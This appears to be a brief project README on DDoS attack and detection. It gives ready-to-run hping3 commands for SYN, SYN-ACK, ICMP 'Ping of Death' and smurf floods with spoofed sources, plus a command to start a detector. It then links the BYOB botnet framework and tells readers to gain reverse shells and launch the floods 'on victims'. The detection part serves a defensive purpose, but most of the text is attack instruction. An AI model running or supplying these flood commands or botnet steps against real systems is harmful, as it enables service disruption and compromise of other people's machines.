# DDOS attack and detection
Hping3, SniffnDetect and BYOB demonstration


## 1) DDOS attack
```sh
$ sudo apt intstall hping3
```
4 Attacks namely : 
- TCP SYN flood
```sh
$ sudo hping3 -S -p <port no> --flood --rand-source <target ip>
```
- TCP SYN-ACK flood
```sh
$ sudo hping3 -SA -p <port no> --flood --rand-source <target ip>
```
- Ping of Death 
```sh
$ sudo hping3 -1 -d <max packet size> -p <port no> --flood --rand-source <target ip>
```
- ICMP Smurf Attack
```sh
$ sudo hping3 -1 -d <max packet size> -p <port no> --flood <target ip> -a <target ip>
```

## DDOS Detection 
```sh
$ cd ddos-detector
$ sudo python3 app.py
```
Can detect the above attacks in the attack terminal with this toolkit

## BYOB

[Installation](https://github.com/malwaredllc/byob)

Gain access to reverse shell after installtion, and execute the above attacks on victims 



## License
MIT
